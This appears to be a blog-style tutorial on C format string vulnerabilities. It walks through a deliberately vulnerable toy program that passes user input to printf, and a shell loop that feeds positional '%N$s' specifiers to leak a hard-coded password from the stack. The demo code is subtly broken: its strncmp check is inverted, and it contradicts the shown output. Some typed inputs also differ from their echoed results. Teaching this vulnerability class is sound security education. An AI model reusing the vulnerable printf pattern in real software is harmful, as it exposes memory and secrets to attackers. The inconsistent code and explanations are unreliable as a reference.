---
layout: post
title: Fromat String Vulnerabilities
updated: 2018-11-22 13:00
tags: [ctf, binary exploit, tech]
---

## Format strings

Format strings are used in many languages to specify the type of output.
These types can range from strings, integers all the way up to pointers.

Some examples:
{% highlight plaintext %}
%d - Integer
%s - String
%c - Character
%x - Hexadecimal
```
{% endhighlight %}

Although harmless when used in the intended fashion, these strings can be extremely dangerous if code is written in the unintended manner. After all it should just work shouldn't it ;).

## What the leak!

A couple of months ago when I was tackling the format exercises of protostar I came across format string vulnerabilities. The basic idea is that an attacker is able to leak information using format strings. These vulnerabilities are specific to the C language.

Let's take a look at a normal C program.

{% highlight c %}
int main() {
    char abc[32];
    fgets(abc, 32, stdin);
    printf("%s", abc);
    return 0;
}
{% endhighlight %}

On running this program we get our expected behavior...user gives, user gets.

{% highlight shell %}
$ gcc main.c
$ ./a.out
test
test
{% endhighlight %}

Notice that this program is not vulnerable to the buffer overflow attack as it uses the `fgets()` function. Now let's take a look at the same program, but with a slight modification.

{% highlight c %}
int main() {
    char abc[32];
    fgets(abc, 32, stdin);
    printf(abc);
    return 0;
}
{% endhighlight %}

The only difference is that `abc` is passed as the first parameter, which is supposed to be for the format string. Let's take a look.

{% highlight shell %}
$ gcc main.c
$ ./a.out
test
test
{% endhighlight %}

Hmmm, nothing interesting yet. Let's go a step further and try adding format specifiers to our input...

{% highlight shell %}
$ ./a.out
test %s
test test %s
{% endhighlight %}

Hey, that's our input... basically what's happening here is that, since we have not specified the second parameter of printf, it is using garbage as an address for the `%s`, however this so called garbage is an address on the stack. And from our knowledge, the stack contains variables. So it's printing the value of `abc`.

Let's take this a little further.

{% highlight c %}
int main() {
    const char *super_secret_creds = "time_mr_freeman";
    char pass[32];
    printf("Enter the pass:");
    fgets(pass, 32, stdin);
    if(strncmp(pass, super_secret_creds, 15)) {
        printf("Welcome to Black Mesa, Dr. Gordon Freeman\n");
    } else {
        printf("bzzzt! invalid password:");
        printf(pass);
    }
}
{% endhighlight %}

Compiling...executing...

{% highlight shell %}
$ gcc main.c
$ ./a.out
Enter the pass:test
bzzzt! invalid password:test
{% endhighlight %}

Now I know that you can easily get the creds using the "strings" command. But for sake of realism let's assume that this binary is being served as a service on some remote server. This means that I aka the attacker does not have access to the binary, I can only interact with it.

{% highlight shell %}
$ ./a.out
Enter the pass:text %s
bzzzt! invalid password:test bzzzt! invalid password
$ ./a.out
Enter the pass:text %1$s
bzzzt! invalid password:test bzzzt! invalid password
{% endhighlight %}

Notice the new notation `%1$s`. What this means is that print the data at position 1 in this location. Let me elaborate...

{% highlight c %}
int main() {
    int a = 33, b = 1337;
    printf("%2$d %1$d", a, b);
    return 0;
}
{% endhighlight %}
You get "1337 33" as the output and not "33 1337".

Now for our case it's a little painful to go on typing the numbers so lets automate it...if you don't understand shellscript, I can't help you, try googling and learning it first.

{% highlight shell %}
#!/bin/sh
max=16
b="\$s"
for i in `seq 2 $max`
do
    echo "%$i$b" | ./a.out
done
{% endhighlight %}

Make it executable and run it...

{% highlight shell %}
$ chmod +x exploit.sh
$ ./exploit.sh
...garbage...
...more garbage...
Enter the pass:bzzzt! invalid password:time_mr_freeman
...garbage...
$ ./a.out
Enter the pass:time_mr_freeman
Welcome to Black Mesa, Dr. Gordon Freeman
{% endhighlight %}

And there you have it. A format string exploit. We've successfully leaked memory and got the credentials.

## The fix

So how do we fix it? Simple...don't write crappy code. We all do, so [here](https://en.wikipedia.org/wiki/Uncontrolled_format_string#Compilers_Prevention)'s a little guide to helping you not write code with format string vulnerabilities.

## Source code
[format str exp](https://github.com/dsouzadyn/format_str_exp)
